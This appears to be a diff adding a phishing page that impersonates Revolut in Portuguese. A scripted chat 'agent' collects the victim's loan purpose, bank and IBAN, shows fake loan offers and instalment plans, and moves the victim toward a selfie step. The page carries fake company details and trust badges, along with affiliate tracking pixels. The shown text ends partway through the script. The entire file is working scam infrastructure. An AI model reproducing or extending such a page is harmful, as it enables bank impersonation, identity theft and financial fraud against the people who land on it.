@@ -1,0 +1,705 @@
+<!DOCTYPE html><html lang="pt-PT"><head>
+<script>
+(function(){
+  var UTM_KEYS=['src','sck','utm_source','utm_campaign','utm_medium','utm_content','utm_term','fbclid','ttclid','gclid','gbraid','wbraid','click_id','CampaignID']; window.TRACKING_KEYS=UTM_KEYS;
+  var p=new URLSearchParams(window.location.search);
+  UTM_KEYS.forEach(function(k){ if(p.get(k)) localStorage.setItem(k,p.get(k)); });
+  var changed=false;
+  UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!p.has(k)){p.set(k,v);changed=true;} });
+  if(changed) history.replaceState(null,'','?'+p.toString());
+  document.addEventListener('click',function(e){
+    var a=e.target.closest('a');
+    if(a&&a.href){ try{ var u=new URL(a.href,window.location.href); UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!u.searchParams.has(k)) u.searchParams.set(k,v); }); a.href=u.toString(); }catch(ex){} }
+  },true);
+})();
+</script>
+<script>
+function redirectWithParams(destination) {
+const currentParams = window.location.search;
+if (!currentParams) {
+window.location.href = destination;
+return;
+}
+
+if (destination.includes("?")) {
+window.location.href = destination + "&" + currentParams.substring(1);
+} else {
+window.location.href = destination + currentParams;
+}
+}
+</script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Revolut · Conversa com Ingrid Torres</title>
+<link rel="icon" href="images/revolut-favicon.svg">
+<link rel="preload" as="image" href="images/ingrid-avatar.png" fetchpriority="high">
+<link rel="preload" as="image" href="images/revolut-logo.svg">
+<link rel="prefetch" href="aprovado.html">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{background:#f3f4f6;color:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;background:#f3f4f6}
+  .wrap.has-input{padding-bottom:80px;}
+
+  /* Top bar */
+  .topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:#fff;border-bottom:1px solid #eee}
+  .menu-btn{width:36px;height:36px;border-radius:10px;background:#f1ecff;display:flex;align-items:center;justify-content:center;border:0}
+  .menu-btn span{display:block;width:14px;height:2px;background:#0a0a0a;position:relative}
+  .menu-btn span::before,.menu-btn span::after{content:"";position:absolute;left:0;width:14px;height:2px;background:#0a0a0a}
+  .menu-btn span::before{top:-5px}.menu-btn span::after{top:5px}
+  .brand{font-weight:800;font-size:22px;letter-spacing:-0.5px;margin-left:10px;flex:1}
+  .user-block{display:flex;align-items:center;gap:10px}
+  .user-info{text-align:right;line-height:1.1}
+  .user-info .name{font-size:13px;font-weight:600;text-transform:capitalize}
+  .user-info .nif{font-size:11px;color:#9ca3af;letter-spacing:1px}
+  .avatar{width:34px;height:34px;border-radius:50%;border:1.5px solid #0a0a0a;display:flex;align-items:center;justify-content:center}
+  .avatar svg{width:18px;height:18px}
+
+  /* Chat card */
+  .chat-card{margin:16px;background:#fff;border-radius:16px;padding:16px;box-shadow:0 1px 2px rgba(0,0,0,.04);flex:1;display:flex;flex-direction:column}
+  .agent{display:flex;align-items:center;gap:10px;padding-bottom:14px;border-bottom:1px solid #f1f1f3}
+  .agent-pic{width:42px;height:42px;border-radius:50%;background:#f1ecff url('images/ingrid-avatar.png') center/cover;border:1px solid #e6e6ea}
+  .agent-name{font-weight:700;font-size:15px}
+  .agent-status{font-size:12px;color:#16a34a;display:flex;align-items:center;gap:5px}
+  .agent-status::before{content:"";width:7px;height:7px;border-radius:50%;background:#16a34a;display:inline-block}
+
+  .messages{padding:14px 4px;display:flex;flex-direction:column;gap:14px}
+  .row{display:flex;align-items:flex-end;gap:8px}
+  .row.them{justify-content:flex-start}
+  .row.me{justify-content:flex-end}
+  .bubble-pic{width:28px;height:28px;border-radius:50%;background:#f1ecff url('images/ingrid-avatar.png') center/cover;flex-shrink:0;border:1px solid #e6e6ea}
+  .bubble{max-width:80%;padding:10px 12px;border-radius:14px;font-size:14px;line-height:1.45;color:#27272a;background:#f5f5f7;position:relative}
+  .row.them .bubble{border-bottom-left-radius:4px}
+  .row.me .bubble{background:#0a0a0a;color:#fff;border-bottom-right-radius:4px}
+  .time{display:block;text-align:right;font-size:10px;color:#9ca3af;margin-top:4px}
+  .row.me .time{color:#d4d4d8}
+
+  .typing{display:inline-flex;gap:3px;align-items:center;padding:8px 12px}
+  .typing span{width:6px;height:6px;border-radius:50%;background:#c4c4cc;animation:blink 1.2s infinite}
+  .typing span:nth-child(2){animation-delay:.2s}.typing span:nth-child(3){animation-delay:.4s}
+  @keyframes blink{0%,80%,100%{opacity:.3;transform:translateY(0)}40%{opacity:1;transform:translateY(-2px)}}
+
+  .options{display:flex;flex-direction:column;gap:10px;margin-top:14px}
+  .opt,.opt2,.opt3,.opt4{background:#fff;border:1.5px solid #f59e0b;color:#0a0a0a;border-radius:999px;padding:13px 16px;font-size:14px;font-weight:500;cursor:pointer;transition:all .15s;font-family:inherit}
+  .opt:hover,.opt2:hover,.opt3:hover,.opt4:hover{background:#fff7ed}
+  .opt:active,.opt2:active,.opt3:active,.opt4:active{transform:scale(.98)}
+  .opt.selected,.opt2.selected,.opt3.selected,.opt4.selected{background:#0a0a0a;color:#fff;border-color:#0a0a0a}
+
+  .iban-box{display:none;flex-direction:column;gap:10px;margin-top:14px}
+  .iban-input{width:100%;border:1.5px solid #f59e0b;border-radius:14px;padding:13px 16px;font-size:15px;font-weight:500;font-family:inherit;outline:none;background:#fff;color:#0a0a0a;text-transform:uppercase}
+  .iban-input:focus{border-color:#0a0a0a}
+  .iban-input::placeholder{color:#9ca3af;font-size:13px;text-transform:none}
+  .iban-error{color:#dc2626;font-size:12px;display:none;margin-top:-4px}
+  .iban-btn{background:#0a0a0a;color:#fff;border:0;border-radius:999px;padding:13px 16px;font-size:14px;font-weight:600;cursor:pointer;transition:all .15s;font-family:inherit}
+  .iban-btn:active{transform:scale(.98)}
+
+  .confirm-box{display:none;flex-direction:column;gap:10px;margin-top:14px}
+  .confirm-msg{background:#f5f5f7;border-radius:14px;padding:14px 16px;font-size:14px;line-height:1.5;color:#0a0a0a}
+  .confirm-msg strong{display:block;font-size:17px;letter-spacing:1px;margin:6px 0;font-weight:700}
+  .confirm-yes{background:#0a0a0a;color:#fff;border:0;border-radius:999px;padding:13px 16px;font-size:14px;font-weight:600;cursor:pointer;transition:all .15s;font-family:inherit}
+  .confirm-yes:active{transform:scale(.98)}
+  .confirm-no{background:#fff;border:1.5px solid #f59e0b;color:#0a0a0a;border-radius:999px;padding:13px 16px;font-size:14px;font-weight:500;cursor:pointer;transition:all .15s;font-family:inherit}
+  .confirm-no:hover{background:#fff7ed}
+  .confirm-no:active{transform:scale(.98)}
+
+  /* Amount selector */
+  .amount-box{display:none;flex-direction:column;gap:14px;margin-top:14px;border:1.5px solid #f59e0b;border-radius:18px;padding:18px 16px;background:#fff}
+  .amount-label{text-align:center;font-size:13px;color:#71717a;font-weight:500}
+  .amount-value{text-align:center;font-size:30px;font-weight:800;letter-spacing:-1px;color:#0a0a0a}
+  .amount-slider{-webkit-appearance:none;width:100%;height:6px;background:linear-gradient(to right,#0a0a0a 0%,#0a0a0a 12%,#e5e7eb 12%,#e5e7eb 100%);border-radius:999px;outline:none}
+  .amount-slider::-webkit-slider-thumb{-webkit-appearance:none;width:22px;height:22px;border-radius:50%;background:#0a0a0a;border:3px solid #fff;box-shadow:0 1px 4px rgba(0,0,0,.25);cursor:pointer}
+  .amount-slider::-moz-range-thumb{width:22px;height:22px;border-radius:50%;background:#0a0a0a;border:3px solid #fff;cursor:pointer}
+  .amount-minmax{display:flex;justify-content:space-between;font-size:12px;color:#9ca3af;margin-top:-6px}
+  .amount-btn{background:#0a0a0a;color:#fff;border:0;border-radius:999px;padding:14px 16px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px}
+  .amount-btn:active{transform:scale(.98)}
+
+  /* Parcelas grid */
+  .parcelas-box{display:none;margin-top:14px;grid-template-columns:1fr 1fr;gap:10px}
+  .parcela-card{background:#fff;border:1.5px solid #e5e7eb;border-radius:16px;padding:14px 10px;text-align:center;cursor:pointer;position:relative;transition:all .15s}
+  .parcela-card:hover{border-color:#0a0a0a}
+  .parcela-card:active{transform:scale(.98)}
+  .parcela-pill{display:inline-block;background:#0a0a0a;color:#fff;font-size:13px;font-weight:700;border-radius:999px;padding:4px 14px;margin-bottom:8px}
+  .parcela-valor{font-size:18px;font-weight:800;color:#0a0a0a;letter-spacing:-.5px}
+  .parcela-total{font-size:11px;color:#2563eb;background:#eff6ff;border-radius:999px;padding:3px 8px;display:inline-block;margin-top:6px}
+  .parcela-pop{position:absolute;top:-8px;right:8px;background:#f59e0b;color:#fff;font-size:9px;font-weight:800;padding:3px 7px;border-radius:6px;letter-spacing:.5px}
+
+  /* Comprovativo */
+  .receipt{display:none;margin-top:14px;background:#fff;border:1px solid #ececf0;border-radius:18px;padding:20px 18px;box-shadow:0 1px 2px rgba(0,0,0,.04);font-family:inherit}
+  .receipt h3{text-align:center;font-size:22px;font-weight:800;letter-spacing:-.5px;margin-bottom:4px}
+  .receipt .sub{text-align:center;font-size:14px;font-weight:600;color:#0a0a0a;margin-bottom:14px}
+  .receipt .status{display:flex;justify-content:center;margin-bottom:14px}
+  .receipt .status span{background:#fef3c7;color:#0a0a0a;font-weight:700;font-size:13px;padding:6px 16px;border-radius:999px;display:inline-flex;align-items:center;gap:6px}
+  .receipt .status svg{width:14px;height:14px;color:#16a34a}
+  .receipt hr{border:0;border-top:1px dashed #e5e7eb;margin:0 0 14px}
+  .receipt .amount-card{background:#fafafc;border-radius:14px;padding:14px;text-align:center;margin-bottom:14px}
+  .receipt .amount-card .l{font-size:12px;color:#71717a;margin-bottom:4px}
+  .receipt .amount-card .v{font-size:26px;font-weight:800;letter-spacing:-.5px}
+  .receipt .row-i{display:flex;justify-content:space-between;align-items:flex-start;font-size:13px;padding:10px 0;border-bottom:1px solid #f4f4f5;gap:12px}
+  .receipt .row-i:last-of-type{border-bottom:0}
+  .receipt .row-i .k{color:#71717a}
+  .receipt .row-i .vv{text-align:right;font-weight:700;color:#0a0a0a;word-break:break-word;max-width:60%}
+  .receipt .row-i .vv small{display:block;font-weight:500;color:#71717a;font-size:12px;margin-top:2px}
+  .receipt .iban-v{font-family:"SFMono-Regular",Menlo,Consolas,monospace;font-size:12px;line-height:1.5}
+  .receipt .foot{margin-top:14px;text-align:center;font-size:12px;color:#52525b;line-height:1.6}
+  .receipt .foot b{display:block;color:#52525b;font-weight:600;margin-bottom:2px}
+
+  .sim-box{display:none;padding:6px 16px 16px 16px;background:transparent;}
+  .sim-row{display:flex;align-items:center;gap:6px}
+  .sim-input{flex:1;min-width:0;border:1.5px solid #e5e7eb;border-radius:24px;padding:11px 14px;font-size:15px;font-family:inherit;outline:none;background:#f5f5f7;color:#0a0a0a}
+  .sim-input:focus{border-color:#d1d5db;background:#fff}
+  .sim-input::placeholder{color:#9ca3af;font-size:14px}
+  .sim-btn{width:44px;height:44px;min-width:44px;border-radius:50%;background:#f59e0b;border:0;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .15s}
+  .sim-btn:active{transform:scale(.93)}
+  .sim-btn svg{width:18px;height:18px;color:#fff}
+
+
+
+
+
+  /* Footer */
+  .site-footer{background:#fff;padding:22px 18px;border-top:1px solid #eee}
+  .footer-inner{text-align:center;display:flex;flex-direction:column;align-items:center;gap:6px}
+  .footer-logo img{height:31px;display:block;margin:0 auto}
+  .footer-company{font-weight:700;font-size:13px;margin-top:4px}
+  .footer-meta{font-size:12px;color:#71717a}
+  .footer-badges{display:flex;gap:18px;justify-content:center;margin-top:10px;font-size:11px;color:#52525b}
+  .footer-badges span{display:flex;align-items:center;gap:5px}
+  .footer-badges svg{width:13px;height:13px}
+</style>
+<script>
+  window.pixelId = "6a5594cf5757aed4584adce8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.googlePixelId = "6a45c62144ce1832379750fa";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.tikTokPixelId = "6a5593d07d9a2ac947099389";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<link rel="prefetch" href="aprovado.html"><link rel="prefetch" href="selfie.html"><script>
+  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
+</script>
+<script defer="" src="js/script.js"></script>
+
+<style id="legal-footer-style">
+  .legal-footer{width:100%;max-width:760px;margin:22px auto 0;padding:18px 16px 26px;text-align:center;color:#6b7280;font-size:11.5px;line-height:1.55}
+  .legal-footer__company{font-weight:700;color:#111827;margin-bottom:2px}
+  .legal-footer__links{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:8px}
+  .legal-footer__links a{color:#111827;text-decoration:underline;text-underline-offset:3px}
+</style>
+  <script src="js/tracking.js" data-project="revoopt-blue-one" defer=""></script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <button class="menu-btn" aria-label="menu"><span></span></button>
+    <div class="brand"><img src="images/revolut-logo.svg" alt="Revolut" style="height:28px;width:auto;display:block;"></div>
+    <div class="user-block">
+      <div class="user-info">
+        <div class="name" id="userName">cliente</div>
+        <div class="nif" id="userNif">*** *** ***</div>
+      </div>
+      <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"></path><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"></path></svg></div>
+    </div>
+  </div>
+
+  <div class="chat-card">
+    <div class="agent">
+      <div class="agent-pic"></div>
+      <div>
+        <div class="agent-name">Ingrid Torres</div>
+        <div class="agent-status">online</div>
+      </div>
+    </div>
+
+    <div class="messages" id="messages">
+<div class="sim-box" id="simBox"><div class="sim-row"><input class="sim-input" id="simInput" type="text" maxlength="10" placeholder="escreva SIM para confirmar..." autocomplete="off"><button class="sim-btn" id="simBtn"><svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M22 2L11 13" stroke-linecap="round" stroke-linejoin="round"></path><path d="M22 2L15 22 11 13 2 9l20-7z" stroke-linecap="round" stroke-linejoin="round"></path></svg></button></div></div>
+      
+    <div class="row them"><div class="bubble-pic"></div><div class="bubble">Olá, Cliente! Estamos quase a concluir a análise do seu pedido. Antes disso, preciso apenas de lhe colocar algumas perguntas rápidas. Qual é o principal motivo para solicitar este crédito?<span class="time">01:01</span></div></div></div>
+
+    <div class="options" id="options" style="display: flex;">
+      <button class="opt" data-v="Pagar despesas">Pagar despesas</button>
+      <button class="opt" data-v="Investir no negócio">Investir no negócio</button>
+      <button class="opt" data-v="Reformar a casa">Reformar a casa</button>
+      <button class="opt" data-v="Emergência médica">Emergência médica</button>
+    </div>
+
+    <div class="options" id="options2" style="display:none">
+      <button class="opt2" data-v="Sim, em banco tradicional">Sim, em banco tradicional</button>
+      <button class="opt2" data-v="Sim, em banco digital">Sim, em banco digital</button>
+      <button class="opt2" data-v="Sim, em ambos">Sim, em ambos</button>
+      <button class="opt2" data-v="Vou abrir uma conta">Vou abrir uma conta</button>
+    </div>
+
+    <div class="options" id="options3" style="display:none">
+      <button class="opt3" data-v="Santander">Santander</button>
+      <button class="opt3" data-v="Millennium BCP">Millennium BCP</button>
+      <button class="opt3" data-v="CGD">CGD</button>
+      <button class="opt3" data-v="Revolut">Revolut</button>
+      <button class="opt3" data-v="Outro Banco">Outro Banco</button>
+    </div>
+
+    <div class="iban-box" id="ibanBox" style="display:none">
+      <input class="iban-input" id="ibanInput" type="text" inputmode="numeric" maxlength="34" placeholder="50 1234 5678 9012 3456 7890 1" autocomplete="off" value="PT">
+      <div class="iban-error" id="ibanError">Introduza um IBAN válido (ex.: PT50 1234 5678 9012 3456 7890 1).</div>
+      <button class="iban-btn" id="ibanBtn">Confirmar IBAN</button>
+    </div>
+
+    <div class="confirm-box" id="ibanConfirm" style="display:none">
+      <div class="confirm-msg">O IBAN para transferência é:<strong id="confirmIbanText"></strong>Está correto?</div>
+      <button class="confirm-yes" id="confirmYes">Sim, está correto</button>
+      <button class="confirm-no" id="confirmNo">Não, quero corrigir</button>
+    </div>
+
+    <div class="options" id="options4" style="display:none">
+      <button class="opt4" data-v="No próximo mês">No próximo mês</button>
+      <button class="opt4" data-v="Em 30 dias">Em 30 dias</button>
+      <button class="opt4" data-v="Em 60 dias">Em 60 dias</button>
+      <button class="opt4" data-v="Em 90 dias">Em 90 dias</button>
+    </div>
+
+    <div class="amount-box" id="amountBox">
+      <div class="amount-label">Valor do empréstimo</div>
+      <div class="amount-value" id="amountValue">€ 10.000,00</div>
+      <input type="range" id="amountRange" class="amount-slider" min="1000" max="75000" step="500" value="10000" style="background: linear-gradient(to right, rgb(10, 10, 10) 0%, rgb(10, 10, 10) 12.1622%, rgb(229, 231, 235) 12.1622%, rgb(229, 231, 235) 100%);">
+      <div class="amount-minmax"><span>€ 1.000,00</span><span>€ 75.000,00</span></div>
+      <button class="amount-btn" id="amountBtn">Confirmar valor <span>✓</span></button>
+    </div>
+
+    <div class="parcelas-box" id="parcelasBox"></div>
+
+    <div class="receipt" id="receipt"></div>
+
+  </div>
+
+
+
+
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-logo"><img src="images/revolut-logo.svg" alt="Revolut" style="height:36px;width:auto;display:block;margin:0 auto;"></div>
+      <div class="footer-company">Rev Business LTD</div>
+      <div class="footer-meta">Avenida da Liberdade, 110 - 1269-046 Lisboa</div>
+      <div class="footer-badges">
+        <span><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-7a2 2 0 00-2-2H6a2 2 0 00-2 2v7a2 2 0 002 2zm10-11V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round"></path></svg>SSL Seguro</span>
+        <span><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"></path><path d="M20.6 5A12 12 0 0112 3 12 12 0 013.4 5 12 12 0 003 9c0 5.6 3.8 10.3 9 11.6 5.2-1.3 9-6 9-11.6 0-1-.1-2-.4-4z" stroke-linecap="round" stroke-linejoin="round"></path></svg>Dados protegidos</span>
+        <span><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 21h18M5 21V7l7-4 7 4v14M9 9h.01M15 9h.01M9 13h.01M15 13h.01M9 17h.01M15 17h.01" stroke-linecap="round" stroke-linejoin="round"></path></svg>Instituição regulada</span>
+      </div>
+    </div>
+  </footer>
+</div>
+
+<script>
+(function(){
+  // header user
+  var nome = localStorage.getItem('nome') || '';
+  var nif  = localStorage.getItem('nif')  || '';
+  if(nome){
+    var p = nome.trim().split(/\s+/);
+    var first = (p[0]||'').toLowerCase();
+    var last  = (p.slice(-1)[0]||'').toLowerCase();
+    document.getElementById('userName').textContent = first + (last && last!==first ? ' '+last : '');
+  }
+  if(nif){
+    var d = nif.replace(/\D/g,'');
+    if(d.length>=9) document.getElementById('userNif').textContent = d.slice(0,3)+' *** *'+d.slice(7,9);
+  }
+
+  var firstName = (nome.trim().split(/\s+/)[0]||'cliente').toLowerCase();
+  var capName = firstName.charAt(0).toUpperCase()+firstName.slice(1);
+
+  function now(){
+    var d = new Date();
+    return ('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2);
+  }
+
+  function addThem(text, cb, delay){
+    var msgs = document.getElementById('messages');
+    var typing = document.getElementById('typingRow');
+    if(!typing){ addTyping(); typing = document.getElementById('typingRow'); }
+    typing.style.display='flex';
+    window.scrollTo(0, document.body.scrollHeight);
+    setTimeout(function(){
+      if(typing && typing.parentNode) typing.parentNode.removeChild(typing);
+      var row = document.createElement('div');
+      row.className = 'row them';
+      row.innerHTML = '<div class="bubble-pic"></div><div class="bubble">'+text+'<span class="time">'+now()+'</span></div>';
+      msgs.appendChild(row);
+      window.scrollTo(0, document.body.scrollHeight);
+      if(cb) cb();
+    }, typeof delay==='number' ? delay : 900);
+  }
+
+  function addMe(text){
+    var msgs = document.getElementById('messages');
+    var row = document.createElement('div');
+    row.className = 'row me';
+    row.innerHTML = '<div class="bubble">'+text+'<span class="time">'+now()+'</span></div>';
+    msgs.appendChild(row);
+    window.scrollTo(0, document.body.scrollHeight);
+  }
+
+  function addTyping(){
+    var msgs = document.getElementById('messages');
+    var typ = document.createElement('div');
+    typ.className='row them'; typ.id='typingRow';
+    typ.innerHTML='<div class="bubble-pic"></div><div class="bubble"><div class="typing"><span></span><span></span><span></span></div></div>';
+    msgs.appendChild(typ);
+  }
+
+  // Warm cache for next step (selfie + approved page assets)
+  try{
+    ['aprovado.html','selfie.html'].forEach(function(u){
+      var l=document.createElement('link'); l.rel='prefetch'; l.href=u; document.head.appendChild(l);
+    });
+  }catch(e){}
+
+  // Show first message quickly (DOM is ready — script is at end of body)
+  addThem('Olá, '+capName+'! Estamos quase a concluir a análise do seu pedido. Antes disso, preciso apenas de lhe colocar algumas perguntas rápidas. Qual é o principal motivo para solicitar este crédito?', function(){
+    document.getElementById('options').style.display = 'flex';
+  }, 350);
+
+  document.querySelectorAll('.opt').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var v = btn.getAttribute('data-v');
+      localStorage.setItem('motivoCredito', v);
+      document.querySelectorAll('.opt').forEach(function(b){b.disabled=true});
+      btn.classList.add('selected');
+      addMe(v);
+      document.getElementById('options').style.display='none';
+      addTyping();
+      addThem('Perfeito! Tem uma conta bancária ativa em seu nome?', function(){
+        document.getElementById('options2').style.display = 'flex';
+      });
+    });
+  });
+
+  document.querySelectorAll('.opt2').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var v = btn.getAttribute('data-v');
+      localStorage.setItem('contaBancaria', v);
+      document.querySelectorAll('.opt2').forEach(function(b){b.disabled=true});
+      btn.classList.add('selected');
+      addMe(v);
+      document.getElementById('options2').style.display='none';
+      addTyping();
+      addThem('Ótimo! Vamos confirmar a conta de destino para a transferência do montante aprovado. Em que banco pretende receber o crédito?', function(){
+        document.getElementById('options3').style.display = 'flex';
+      });
+    });
+  });
+
+  document.querySelectorAll('.opt3').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var v = btn.getAttribute('data-v');
+      localStorage.setItem('bancoDestino', v);
+      document.querySelectorAll('.opt3').forEach(function(b){b.disabled=true});
+      btn.classList.add('selected');
+      addMe(v);
+      document.getElementById('options3').style.display='none';
+      addTyping();
+      var bankLabel = v === 'Outro Banco' ? 'Outro Banco' : v;
+      addThem('Perfeito! Confirme o IBAN da sua conta '+bankLabel+' onde pretende receber o montante do crédito.', function(){
+        var box = document.getElementById('ibanBox');
+        box.style.display='flex';
+        var _ii=document.getElementById('ibanInput');
+        _ii.focus();
+        var _len=_ii.value.length;
+        _ii.setSelectionRange(_len,_len);
+      });
+    });
+  });
+
+  // Protect PT prefix
+  document.addEventListener('DOMContentLoaded', function(){
+    var inp = document.getElementById('ibanInput');
+    if(!inp) return;
+    inp.addEventListener('input', function(){
+      if(!this.value.startsWith('PT')){
+        this.value = 'PT' + this.value.replace(/^P?T?/,'').replace(/^PT/,'');
+        var l=this.value.length; this.setSelectionRange(l,l);
+      }
+    });
+    inp.addEventListener('keydown', function(e){
+      if((e.key==='Backspace'||e.key==='Delete') && this.selectionStart<=2 && this.selectionEnd<=2){
+        e.preventDefault();
+      }
+    });
+  });
+
+  function formatIBAN(val){
+    var raw = val.replace(/\s/g,'').toUpperCase();
+    return raw.match(/.{1,4}/g)?.join(' ') || raw;
+  }
+
+  function isValidIBAN(iban){
+    var raw = iban.replace(/\s/g,'').toUpperCase();
+    if(!raw) return false;
+    if(raw.length < 15 || raw.length > 34) return false;
+    if(!/^[A-Z]{2}[0-9]{2}[A-Z0-9]+$/.test(raw)) return false;
+    return true;
+  }
+
+  var ibanInput = document.getElementById('ibanInput');
+  ibanInput.addEventListener('input', function(){
+    var start = ibanInput.selectionStart;
+    var oldLen = ibanInput.value.length;
+    ibanInput.value = formatIBAN(ibanInput.value);
+    var newLen = ibanInput.value.length;
+    var cursor = start + (newLen - oldLen);
+    ibanInput.setSelectionRange(cursor, cursor);
+    document.getElementById('ibanError').style.display='none';
+  });
+
+  document.getElementById('ibanBtn').addEventListener('click', function(){
+    var val = ibanInput.value.trim();
+    if(!isValidIBAN(val)){
+      document.getElementById('ibanError').style.display='block';
+      ibanInput.focus();
+      return;
+    }
+    document.getElementById('ibanBox').style.display='none';
+    document.getElementById('confirmIbanText').textContent = val;
+    document.getElementById('ibanConfirm').style.display='flex';
+  });
+
+  document.getElementById('confirmYes').addEventListener('click', function(){
+    var val = ibanInput.value.trim();
+    localStorage.setItem('iban', val);
+    addMe(val);
+    document.getElementById('ibanConfirm').style.display='none';
+    addTyping();
+    addThem('Última pergunta! Quando pretende começar a pagar as prestações?', function(){
+      document.getElementById('options4').style.display = 'flex';
+    });
+  });
+
+  document.getElementById('confirmNo').addEventListener('click', function(){
+    document.getElementById('ibanConfirm').style.display='none';
+    var box = document.getElementById('ibanBox');
+    box.style.display='flex';
+    ibanInput.focus();
+  });
+
+  document.querySelectorAll('.opt4').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var v = btn.getAttribute('data-v');
+      localStorage.setItem('primeiraPrestacao', v);
+      document.querySelectorAll('.opt4').forEach(function(b){b.disabled=true});
+      btn.classList.add('selected');
+      addMe(v);
+      document.getElementById('options4').style.display='none';
+      addTyping();
+      addThem('Perfeito! Agora me diga: quanto você precisa?', function(){
+        document.getElementById('amountBox').style.display='flex';
+      });
+    });
+  });
+
+  // --- Amount slider ---
+  var fmtEUR = function(n){ return '€ ' + n.toLocaleString('de-DE',{minimumFractionDigits:2,maximumFractionDigits:2}); };
+  var range = document.getElementById('amountRange');
+  var valueEl = document.getElementById('amountValue');
+  function updateSliderFill(){
+    var pct = ((+range.value - +range.min) / (+range.max - +range.min)) * 100;
+    range.style.background = 'linear-gradient(to right,#0a0a0a 0%,#0a0a0a '+pct+'%,#e5e7eb '+pct+'%,#e5e7eb 100%)';
+  }
+  range.addEventListener('input', function(){
+    valueEl.textContent = fmtEUR(+range.value);
+    updateSliderFill();
+  });
+  updateSliderFill();
+
+  // Coeficientes calibrados para bater exatamente com a tabela de referência (€10.000)
+  var COEFS = [
+    {n:3,  c:0.335892},
+    {n:6,  c:0.168910},
+    {n:12, c:0.085424},
+    {n:24, c:0.043692, pop:true},
+    {n:36, c:0.029792},
+    {n:48, c:0.022849},
+    {n:60, c:0.018689},
+    {n:120,c:0.010412}
+  ];
+
+  function renderParcelas(principal){
+    var box = document.getElementById('parcelasBox');
+    box.innerHTML = '';
+    COEFS.forEach(function(p){
+      var parcela = principal * p.c;
+      var total = parcela * p.n;
+      var card = document.createElement('div');
+      card.className = 'parcela-card';
+      card.setAttribute('data-n', p.n);
+      card.setAttribute('data-parcela', parcela.toFixed(2));
+      card.setAttribute('data-total', total.toFixed(2));
+      card.innerHTML =
+        (p.pop ? '<div class="parcela-pop">POPULAR</div>' : '') +
+        '<div class="parcela-pill">'+p.n+'X</div>' +
+        '<div class="parcela-valor">'+fmtEUR(parcela)+'</div>' +
+        '<div class="parcela-total">Total: '+fmtEUR(total)+'</div>';
+      card.addEventListener('click', function(){
+        var n = card.getAttribute('data-n');
+        var valorParcela = parseFloat(card.getAttribute('data-parcela'));
+        var valorTotal = parseFloat(card.getAttribute('data-total'));
+        localStorage.setItem('valorEmprestimo', principal);
+        localStorage.setItem('parcelas', n);
+        localStorage.setItem('valorParcela', valorParcela.toFixed(2));
+        localStorage.setItem('valorTotal', valorTotal.toFixed(2));
+        localStorage.setItem('selectedLoanAmount', principal);
+        localStorage.setItem('selectedInstallments', n);
+        localStorage.setItem('selectedMonthlyPayment', valorParcela.toFixed(2));
+        addMe(n+'x de '+fmtEUR(valorParcela));
+        document.getElementById('parcelasBox').style.display='none';
+        addTyping();
+        addThem('Perfeito! Vou processar o pagamento agora...', function(){
+          renderReceipt(principal, n, valorParcela, valorTotal);
+          setTimeout(function(){
+            addTyping();
+            addThem('Confirme digitando "SIM" para finalizar sua solicitação:', function(){
+              var sb=document.getElementById('simBox'),msgs2=document.getElementById('messages');
+              msgs2.appendChild(sb);
+              sb.style.display='flex';
+              document.getElementById('simInput').focus();
+              setTimeout(function(){ window.scrollTo(0, document.body.scrollHeight); }, 100);
+            });
+          }, 1500);
+        });
+      });
+
+      box.appendChild(card);
+    });
+    box.style.display='grid';
+  }
+
+  document.getElementById('amountBtn').addEventListener('click', function(){
+    var principal = +range.value;
+    localStorage.setItem('valorEmprestimo', principal);
+    localStorage.setItem('selectedLoanAmount', principal);
+    addMe(fmtEUR(principal));
+    document.getElementById('amountBox').style.display='none';
+    addTyping();
